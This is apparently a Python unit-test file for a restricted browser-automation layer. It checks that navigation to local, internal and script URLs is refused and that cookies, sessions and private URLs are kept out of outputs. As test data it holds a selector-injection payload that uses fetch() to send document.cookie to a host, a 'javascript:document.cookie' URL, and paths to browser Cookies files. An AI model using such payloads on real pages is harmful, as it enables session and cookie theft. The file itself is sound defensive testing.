"""Named GUI operations with fake page/CDP; no real Chrome or network."""
import base64
import io
from pathlib import Path
import sys
import tempfile
import unittest
from unittest.mock import Mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from browser_actions import public_helpers, navigation_url
from execution_policy import HELPERS, PolicyError, execute_source


class BrowserActionTests(unittest.TestCase):
    def actions(self, workspace, url='https://example.test'):
        browser = Mock()
        browser.info.return_value = {'url': url}
        trusted = {name: Mock(return_value=None) for name in HELPERS}
        trusted['js'] = Mock(return_value={})
        return browser, trusted, public_helpers(browser, trusted, workspace)

    def test_only_explicit_gui_operations_are_exposed(self):
        _, _, actions = self.actions('/synthetic-unused-workspace')
        self.assertEqual(set(actions), HELPERS)
        self.assertFalse({'js', 'cdp', 'http_get', 'upload_file', 'start_recording'} & set(actions))

    def test_navigation_rejects_local_profiles_scripts_internal_and_credentials(self):
        for url in ('file:///private/Cookies', 'javascript:document.cookie',
                    'data:text/html,x', 'chrome://settings', 'devtools://x',
                    'https://user:password@example.test', 'https://example.test\nx'):
            with self.subTest(url=url), self.assertRaises(PolicyError):
                navigation_url(url)
        browser, _, actions = self.actions('/unused')
        with self.assertRaises(PolicyError):
            actions['new_tab']('file:///private/Cookies')
        browser.create.assert_not_called()

    def test_internal_or_file_document_cannot_be_read_or_operated(self):
        for url in ('file:///private/Cookies', 'chrome://settings/'):
            browser, trusted, actions = self.actions('/unused', url=url)
            for name, args in [('read_page', []), ('click_at_xy', [1, 1]),
                               ('capture_screenshot', []), ('type_text', ['x'])]:
                with self.subTest(url=url, name=name), self.assertRaises(PolicyError):
                    actions[name](*args)
            browser.cdp.assert_not_called()
            trusted['js'].assert_not_called()

    def test_failed_navigation_stops_before_wait_or_dom_read_without_retry(self):
        browser,trusted,actions=self.actions('/unused')
        browser.cdp.return_value={'frameId':'owned-frame','errorText':'net::ERR_NAME_NOT_RESOLVED'}
        with self.assertRaisesRegex(RuntimeError,'^browser_navigation_failed: net::ERR_NAME_NOT_RESOLVED$'):
            execute_source("goto_url('https://example.test/private-token')\nwait_for_load()\nprint(read_page())",actions,io.StringIO())
        browser.cdp.assert_called_once_with('Page.navigate',url='https://example.test/private-token')
        browser.info.assert_called_once_with() # Source-page guard precedes navigation.
        trusted['wait_for_load'].assert_not_called();trusted['js'].assert_not_called()

    def test_navigation_error_never_echoes_nonstandard_error_text_or_url(self):
        browser,_,actions=self.actions('/unused')
        browser.cdp.return_value={'errorText':'net::ERR_FAILED for https://private.example/token'}
        with self.assertRaisesRegex(RuntimeError,'^browser_navigation_failed: navigation_error$'):
            actions['goto_url']('https://example.test')

    def test_guard_diagnostic_distinguishes_internal_scheme_without_exposing_address(self):
        for url,scheme in [('chrome://version/private','chrome'),
                           ('chrome-error://chromewebdata/private','chrome-error'),
                           ('file:///private/Cookies','file'),
                           ('private-scheme://private/token','other')]:
            browser,trusted,actions=self.actions('/unused',url)
            with self.subTest(scheme=scheme),self.assertRaisesRegex(PolicyError,'^browser_document_not_allowed: scheme='+scheme+'$'):
                actions['read_page']()
            browser.cdp.assert_not_called();trusted['js'].assert_not_called()

    def test_selector_is_encoded_as_data(self):
        _, trusted, actions = self.actions('/unused')
        selector = '\");fetch(\"https://example.test\",{body:document.cookie});//LIMIT'
        actions['read_page'](selector)
        import json
        expression = trusted['js'].call_args.args[0]
        self.assertIn('querySelectorAll(' + json.dumps(selector) + ')', expression)
        self.assertIn('.slice(0,12000)', expression)

    def test_empty_target_metadata_uses_owned_main_frame_before_dom_read(self):
        browser,trusted,actions=self.actions('/unused',url='')
        browser.cdp.return_value={'frameTree':{'frame':{'url':'https://example.test'}}}
        actions['read_page']()
        browser.cdp.assert_called_once_with('Page.getFrameTree')
        trusted['js'].assert_called_once()

    def test_empty_target_metadata_never_permits_missing_or_internal_frame(self):
        for frame in ({},{'url':''},{'url':'chrome://settings'},{'url':'file:///private/Cookies'}):
            with self.subTest(frame=frame):
                browser,trusted,actions=self.actions('/unused',url='')
                browser.cdp.return_value={'frameTree':{'frame':frame}}
                with self.assertRaisesRegex(PolicyError,'browser_document_not_allowed'):
                    actions['read_page']()
                trusted['js'].assert_not_called()

    def test_network_events_never_export_cookie_headers(self):
        _, trusted, actions = self.actions('/unused')
        trusted['drain_events'].return_value = [
            {'method': 'Network.requestWillBeSentExtraInfo', 'params': {'headers': {'Cookie': 'secret'}}}]
        self.assertEqual(actions['drain_events'](), [{'method': 'Network.requestWillBeSentExtraInfo'}])

    def test_screenshot_uses_exclusive_generated_file_and_no_path_argument(self):
        with tempfile.TemporaryDirectory() as folder:
            browser, _, actions = self.actions(folder)
            browser.cdp.return_value = {'data': base64.b64encode(b'fake-png').decode()}
            first = Path(actions['capture_screenshot']())
            second = Path(actions['capture_screenshot']())
            self.assertNotEqual(first, second)
            self.assertEqual(first.parent, Path(folder))
            self.assertEqual(first.read_bytes(), b'fake-png')
            with self.assertRaises(TypeError):
                actions['capture_screenshot'](path='/private/Cookies')

    def test_browser_hotkey_modifiers_are_not_exposed(self):
        _, trusted, actions = self.actions('/unused')
        with self.assertRaises(TypeError):
            actions['press_key']('l', modifiers=4)
        trusted['press_key'].assert_not_called()

    def test_dialog_requires_explicit_boolean_and_is_sent_once(self):
        browser, _, actions = self.actions('/unused')
        with self.assertRaises(PolicyError):
            actions['answer_dialog']('yes')
        browser.cdp.assert_not_called()
        actions['answer_dialog'](False)
        browser.cdp.assert_called_once_with('Page.handleJavaScriptDialog', accept=False)

    def test_script_cannot_extract_a_helper_callable(self):
        _, _, actions = self.actions('/unused')
        for code in ('print(page_info)', 'page_info.__call__()', 'print(page_info.__globals__)'):
            with self.subTest(code=code), self.assertRaises(PolicyError):
                execute_source(code, actions, io.StringIO())

    def test_switch_tab_returns_tab_handle_not_cdp_session(self):
        browser,trusted,actions=self.actions('/unused')
        browser.info.return_value={'targetId':'owned-tab','url':'https://example.test'}
        trusted['switch_tab'].return_value='private-cdp-session'
        self.assertEqual(actions['switch_tab']('owned-tab'),{'tab_id':'owned-tab'})
        trusted['switch_tab'].assert_called_once_with('owned-tab',activate=False)

    def test_finish_returns_semantic_cleanup_result_without_transport_details(self):
        _,trusted,actions=self.actions('/unused')
        trusted['finish_browser'].return_value={'success':True,'remaining_owned_targets':[],
            'browser_close_deferred':'shared_browser','browser_closed':False}
        self.assertEqual(actions['finish_browser'](),{'success':True,'cleanup_complete':True})
        trusted['finish_browser'].return_value={'success':False,'remaining_owned_targets':['private-target'],
            'cleanup_errors':{'private-target':{'code':'close_observation_failed'}}}
        result=actions['finish_browser']()
        self.assertFalse(result['cleanup_complete'])
        self.assertEqual(result['remaining_tabs'],1)
        self.assertNotIn('private-target',str(result))


if __name__ == '__main__':
    unittest.main()
